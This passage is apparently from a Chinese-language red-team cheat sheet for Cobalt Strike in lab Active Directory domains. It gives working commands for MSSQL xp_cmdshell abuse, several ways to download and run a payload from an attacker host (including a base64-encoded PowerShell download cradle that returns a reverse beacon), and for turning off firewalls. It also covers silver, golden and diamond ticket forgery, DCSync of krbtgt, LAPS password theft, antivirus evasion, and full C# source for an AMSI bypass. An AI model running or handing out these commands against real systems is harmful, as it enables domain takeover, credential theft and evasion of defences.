beacon> powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
beacon> powerpick Get-SQLInstanceDomain （输出正在上下文运行MSSQL的实例）
beacon> powerpick Get-SQLConnectionTest -Instance "DOMAIN,1433" | fl (测试我们是否可以连接到数据库)
# beacon> powershell Get-SQLServerInfo -Instance "sql-2.dev.cyberbotic.io,1433" (关于实例的更多信息)

# beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /enum:sqlspns
# beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io /module:info

（有凭据登录）
beacon> execute-assembly I:\0x0D_KALI_Tools\SQLRecon.exe /a:local /u:sa /p:Admin@666 /h:10.0.10.110 /m:whoami

beacon> execute-assembly I:\0x0D_KALI_Tools\SQLRecon.exe /a:local /u:sa /p:Admin@666 /h:10.0.10.110 /m:impersonate （枚举是否存在可模拟的用户）
beacon> execute-assembly execute-assembly I:\0x0D_KALI_Tools\SQLRecon.exe /auth:local /u:mssql /p:Admin@666 /m:info /h:10.0.10.110 /i:VULNTARGET\Administrator  (模拟用户)

!!!!!(执行命令)
# beacon> execute-assembly I:\0x0D_KALI_Tools\SQLRecon.exe /auth:local /u:mssql /p:Admin@666 /h:10.0.10.110 /m:enablexp /i:VULNTARGET\Administrator
# beacon> execute-assembly I:\0x0D_KALI_Tools\SQLRecon.exe /auth:local /u:mssql /p:Admin@666 /h:10.0.10.110 /m:xpcmd /i:VULNTARGET\Administrator /c:whoami
!beacon> powerpick Invoke-SQLOSCmd -Instance  "DOMAIN,1433" -Command "whoami" -RawResults  (xp_cmdshell)
```

- **MSSQL XPCMDSHELL 上线 cs：**
```
# beacon> execute-assembly I:\0x0D_KALI_Tools\SQLRecon.exe /auth:local /u:mssql /p:Admin@666 /h:10.0.10.110 /m:xpcmd /i:VULNTARGET\Administrator /c:"powershell iwr -Uri http://10.0.10.111:8080/c -OutFile C:\programdata\this.exe"
# beacon> execute-assembly I:\0x0D_KALI_Tools\SQLRecon.exe /auth:local /u:mssql /p:Admin@666 /h:10.0.10.110 /m:xpcmd /i:VULNTARGET\Administrator /c:"C:\programdata\this.exe"
# beacon> connect 10.0.10.110 4445

!
(设置端口转发)
beacon> rportfwd 8080 127.0.0.1 80

(关闭防火墙，创建出入栈规则)
beacon> run netsh advfirewall set allprofiles state off

beacon> powerpick Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
beacon> powerpick New-NetFirewallRule -DisplayName "Allow 4444" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4444
beacon> powerpick New-NetFirewallRule -DisplayName "Allow 8080" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8080
beacon> powerpick New-NetFirewallRule -DisplayName "Allow 80" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 80

http://10.10.140.20:8080/p   (pivot.ps1)  (Site Managerment -> Host File)

(encode iex command)
PS C:\Users\13461> $Command = "iex (new-object net.webclient).downloadstring('http://10.10.140.20:8080/p')"
PS C:\Users\13461> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Command)
PS C:\Users\13461> $EncodedCommand = [Convert]::ToBase64String($Bytes)
PS C:\Users\13461> Write-Output $EncodedCommand
aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0ADAALgAyADAAOgA4ADAAOAAwAC8AcAAnACkA

(execute the command and get the reverse beacon)
beacon> powerpick Invoke-SQLOSCmd -Instance "DOMAIN,1433" -Command "powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0ADAALgAyADAAOgA4ADAAOAAwAC8AcAAnACkA" -RawResults
```

- MSSQL 连接
```
(查找是否有连接)
beacon> execute-assembly I:\0x0D_KALI_Tools\SQLRecon.exe /auth:local /u:mssql /p:Admin@666 /h:10.0.10.110 /m:links
beacon> execute-assembly I:\0x0D_KALI_Tools\SQLRecon.exe /auth:local /u:mssql /p:Admin@666 /h:10.0.10.110 /m:info /l:IP
```

#### 票据类
- silver ticket
```
在域控制器中转储了一个用户的kerberos hash （des_cbc_md4, aes256）, 并且这个用户没有权限去访问域内cifs, 就可以使用silver ticket来进行伪造票据
(获得一个运行服务的凭据后，可以直接伪造票据 直接使用)

whoami /user (获取SID)

PS C:\Users\Attacker> C:\Tools\Rubeus.exe silver /service:cifs /aes256:3ad3ca5c512dd138e3917b0848ed09399c4bbe19e83efe661649aa3adf2cb98f /user:fakeuser /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap

beacon> execute-assembly C:\Tools\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:fakeuser /password:FakePass /ticket:doIFXD[...]MuaW8=
beacon> steal_token 5668
beacon> ls \\wkstn-1.dev.cyberbotic.io\c$
```

- golden ticket
```
获取krbtgt的hash后， 可以伪造票据访问在域中的任何一台计算机上的用户和服务

# beacon> dcsync dev.cyberbotic.io DEV\krbtgt （获取krbtgt hash, aes256_hmac）

PS C:\Users\Attacker> C:\Tools\Rubeus.exe golden /aes256:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user:fakeuser /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap

beacon> execute-assembly C:\Tools\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=
beacon> steal_token 5060
beacon> run klist
beacon> ls \\dc-2.dev.cyberbotic.io\c
```

- diamond ticket
```
通过修改 DC 颁发的合法 TGT 的字段来制作, 安全性比golden ticket 要高

(获取krbtgt的AES256 hash, aes256_hmac)
beacon> shell C:\Users\administrator\Desktop\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:de1ay.com /user:krbtgt" "exit"

(伪造票据, 两种方法选一种即可)
1) beacon> shell C:\Users\mssql\Desktop\Rubeus.exe diamond /krbkey:42e65a58c000dab8d353b1ff2bee93383f27f0966767afa8c1f32fc51122d118 /user:mssql /password:1qaz@WSX /enctype:aes /domain:de1ay.com /dc:dc.de1ay.com /ticketuser:administrator /ptt /nowra
2) beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:nlamb /ticketuserid:1106 /groups:512 /krbkey:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap

(使用票据)
beacon> shell C:\Users\mssql\Desktop\Rubeus.exe asktgs /ticket:doIFOjC[...]MuaW8= /service:cifs/dc.de1ay.com /ptt /nowrap
```


#### LAPS
```
(枚举LAPS)
beacon> ls C:\Program Files\LAPS\CSE
beacon> powershell Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl
beacon> powershell Get-DomainComputer | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName
(https://github.com/leoloobeek/LAPSToolkit)
beacon> powershell-import C:\Tools\LAPSToolkit\LAPSToolkit.ps1
beacon> powershell Find-LAPSDelegatedGroups

(获取密码)
beacon> powershell Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd
beacon> make_token .\LapsAdmin 1N3FyjJR5L18za
beacon> ls \\wkstn-1\c$

(密码过期保护, 拿到admin权限后可以修改计算机laps的到期时间)
beacon> powershell Set-DomainObject -Identity wkstn-1 -Set @{'ms-Mcs-AdmPwdExpirationTime' = '136257686710000000'} -Verbose
```

#### 免杀
```
./build.sh pipe VirtualAlloc 350000 5 false false none /mnt/c/Tools/cobaltstrike/artifacts

(使用ThreatCheck进行分析)
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\artifacts\pipe\artifact64svcbig.exe

如果有 Identified end of bad bytes at offse，打开ghidra, Search > Memory中搜索, 并一步一步替换......

直到 [+] No threat found!
加载cna，generation all payloads
```

修改 C2, 避免 RWX, 禁用 AMSI
```
stage {
        set userwx "false";
        set cleanup "true";
        set obfuscate "true";
        set module_x64 "xpsservices.dll";
}

post-ex {
        set amsi_disable "true";
}
```

- AMSI bypas
```
$HWBP = @"
using System;
using System.Collections.Generic;
using System.Linq.Expressions;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;

namespace HWBP
{
    public class Amsi
    {
        static string a = "msi";
        static string b = "anB";
        static string c = "ff";
        static IntPtr BaseAddress = WinAPI.LoadLibrary("a" + a + ".dll");
        static IntPtr pABuF = WinAPI.GetProcAddress(BaseAddress, "A" + a + "Sc" + b + "u" + c + "er");
        static IntPtr pCtx = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WinAPI.CONTEXT64)));
        
        public static void Bypass()
        {
            WinAPI.CONTEXT64 ctx = new WinAPI.CONTEXT64();
            ctx.ContextFlags = WinAPI.CONTEXT64_FLAGS.CONTEXT64_ALL;

            MethodInfo method = typeof(Amsi).GetMethod("Handler", BindingFlags.Static | BindingFlags.Public);
            IntPtr hExHandler = WinAPI.AddVectoredExceptionHandler(1, method.MethodHandle.GetFunctionPointer());
            
            Marshal.StructureToPtr(ctx, pCtx, true);
            bool b = WinAPI.GetThreadContext((IntPtr)(-2), pCtx);
            ctx = (WinAPI.CONTEXT64)Marshal.PtrToStructure(pCtx, typeof(WinAPI.CONTEXT64));

            EnableBreakpoint(ctx, pABuF, 0);
            WinAPI.SetThreadContext((IntPtr)(-2), pCtx);
        }
        
        public static long Handler(IntPtr exceptions)
        {
            WinAPI.EXCEPTION_POINTERS ep = new WinAPI.EXCEPTION_POINTERS();
            ep = (WinAPI.EXCEPTION_POINTERS)Marshal.PtrToStructure(exceptions, typeof(WinAPI.EXCEPTION_POINTERS));

            WinAPI.EXCEPTION_RECORD ExceptionRecord = new WinAPI.EXCEPTION_RECORD();
            ExceptionRecord = (WinAPI.EXCEPTION_RECORD)Marshal.PtrToStructure(ep.pExceptionRecord, typeof(WinAPI.EXCEPTION_RECORD));

            WinAPI.CONTEXT64 ContextRecord = new WinAPI.CONTEXT64();
            ContextRecord = (WinAPI.CONTEXT64)Marshal.PtrToStructure(ep.pContextRecord, typeof(WinAPI.CONTEXT64));

            if (ExceptionRecord.ExceptionCode == WinAPI.EXCEPTION_SINGLE_STEP && ExceptionRecord.ExceptionAddress == pABuF)
            {
                ulong ReturnAddress = (ulong)Marshal.ReadInt64((IntPtr)ContextRecord.Rsp);

                IntPtr ScanResult = Marshal.ReadIntPtr((IntPtr)(ContextRecord.Rsp + (6 * 8))); // 5th arg, swap it to clean

                Marshal.WriteInt32(ScanResult, 0, WinAPI.AMSI_RESULT_CLEAN);

                ContextRecord.Rip = ReturnAddress;
                ContextRecord.Rsp += 8;
                ContextRecord.Rax = 0; // S_OK
                
                Marshal.StructureToPtr(ContextRecord, ep.pContextRecord, true); //Paste our altered ctx back in TO THE RIGHT STRUCT
                return WinAPI.EXCEPTION_CONTINUE_EXECUTION;
            }
            else
            {
                return WinAPI.EXCEPTION_CONTINUE_SEARCH;
            }

        }

        public static void EnableBreakpoint(WinAPI.CONTEXT64 ctx, IntPtr address, int index)
        {
            switch (index)
            {
                case 0:
                    ctx.Dr0 = (ulong)address.ToInt64();
                    break;
                case 1:
                    ctx.Dr1 = (ulong)address.ToInt64();
                    break;
                case 2:
                    ctx.Dr2 = (ulong)address.ToInt64();
                    break;
                case 3:
                    ctx.Dr3 = (ulong)address.ToInt64();
                    break;
            }

            ctx.Dr7 = SetBits(ctx.Dr7, 16, 16, 0);
            ctx.Dr7 = SetBits(ctx.Dr7, (index * 2), 1, 1);
            ctx.Dr6 = 0;

            Marshal.StructureToPtr(ctx, pCtx, true);
        }

        public static ulong SetBits(ulong dw, int lowBit, int bits, ulong newValue)
        {
            ulong mask = (1UL << bits) - 1UL;
            dw = (dw & ~(mask << lowBit)) | (newValue << lowBit);
            return dw;
        }
    }

    public class WinAPI
    {
        public const UInt32 DBG_CONTINUE = 0x00010002;
        public const UInt32 DBG_EXCEPTION_NOT_HANDLED = 0x80010001;
        public const Int32 EXCEPTION_CONTINUE_EXECUTION = -1;
        public const Int32 EXCEPTION_CONTINUE_SEARCH = 0;
        public const Int32 CREATE_PROCESS_DEBUG_EVENT = 3;
        public const Int32 CREATE_THREAD_DEBUG_EVENT = 2;
        public const Int32 EXCEPTION_DEBUG_EVENT = 1;
        public const Int32 EXIT_PROCESS_DEBUG_EVENT = 5;
        public const Int32 EXIT_THREAD_DEBUG_EVENT = 4;
        public const Int32 LOAD_DLL_DEBUG_EVENT = 6;
        public const Int32 OUTPUT_DEBUG_STRING_EVENT = 8;
        public const Int32 RIP_EVENT = 9;
        public const Int32 UNLOAD_DLL_DEBUG_EVENT = 7;

        public const UInt32 EXCEPTION_ACCESS_VIOLATION = 0xC0000005;
        public const UInt32 EXCEPTION_BREAKPOINT = 0x80000003;
        public const UInt32 EXCEPTION_DATATYPE_MISALIGNMENT = 0x80000002;
        public const UInt32 EXCEPTION_SINGLE_STEP = 0x80000004;
        public const UInt32 EXCEPTION_ARRAY_BOUNDS_EXCEEDED = 0xC000008C;
        public const UInt32 EXCEPTION_INT_DIVIDE_BY_ZERO = 0xC0000094;
        public const UInt32 DBG_CONTROL_C = 0x40010006;
        public const UInt32 DEBUG_PROCESS = 0x00000001;
        public const UInt32 CREATE_SUSPENDED = 0x00000004;
        public const UInt32 CREATE_NEW_CONSOLE = 0x00000010;

        public const Int32 AMSI_RESULT_CLEAN = 0;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        public static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("Kernel32.dll")]
        public static extern IntPtr AddVectoredExceptionHandler(uint First, IntPtr Handler);

        [Flags]
        public enum CONTEXT64_FLAGS : uint
        {
            CONTEXT64_AMD64 = 0x100000,
            CONTEXT64_CONTROL = CONTEXT64_AMD64 | 0x01,
            CONTEXT64_INTEGER = CONTEXT64_AMD64 | 0x02,
            CONTEXT64_SEGMENTS = CONTEXT64_AMD64 | 0x04,
            CONTEXT64_FLOATING_POINT = CONTEXT64_AMD64 | 0x08,
            CONTEXT64_DEBUG_REGISTERS = CONTEXT64_AMD64 | 0x10,
            CONTEXT64_FULL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_FLOATING_POINT,
            CONTEXT64_ALL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_SEGMENTS | CONTEXT64_FLOATING_POINT | CONTEXT64_DEBUG_REGISTERS
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct M128A
        {
            public ulong High;
            public long Low;

            public override string ToString()
            {
                return string.Format("High:{0}, Low:{1}", this.High, this.Low);
            }
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct XSAVE_FORMAT64
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            public CONTEXT64_FLAGS ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;

            public XSAVE_FORMAT64 DUMMYUNIONNAME;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            public ulong VectorControl;

            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct EXCEPTION_RECORD
        {
            public uint ExceptionCode;
            public uint ExceptionFlags;
            public IntPtr ExceptionRecord;
            public IntPtr ExceptionAddress;
            public uint NumberParameters;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 15, ArraySubType = UnmanagedType.U4)] public uint[] ExceptionInformation;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct EXCEPTION_POINTERS
        {
            public IntPtr pExceptionRecord;
            public IntPtr pContextRecord;
        }
    }
}
"@

Add-Type -TypeDefinition $HWBP
[HWBP.Amsi]::Bypass()
```

保存在 teamserver 的/bypass
运行前先下载执行 bypasss
```
iex (new-object net.webclient).downloadstring("http://10.10.5.50:80/bypass"); iex (new-object net.webclient).downloadstring("http://10.10.5.50:80/a")
```

- **行为检测**
在使用 psexec 横向移动时候，需要手动执行：
```
beacon> ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
[*] Updating the spawnto_x64 process to 'C:\Windows\System32\dllhost.exe'
[*] artifact kit settings:
[*]    service     = ''
[*]    spawnto_x86 = 'C:\Windows\SysWOW64\rundll32.exe'
[*]    spawnto_x64 = 'C:\Windows\System32\dllhost.exe'

beacon> ak-settings spawnto_x86 C:\Windows\SysWOW64\dllhost.exe
[*] Updating the spawnto_x86 process to 'C:\Windows\SysWOW64\dllhost.exe'
[*] artifact kit settings:
[*]    service     = ''
[*]    spawnto_x86 = 'C:\Windows\SysWOW64\dllhost.exe'
[*]    spawnto_x64 = 'C:\Windows\System32\dllhost.exe'
```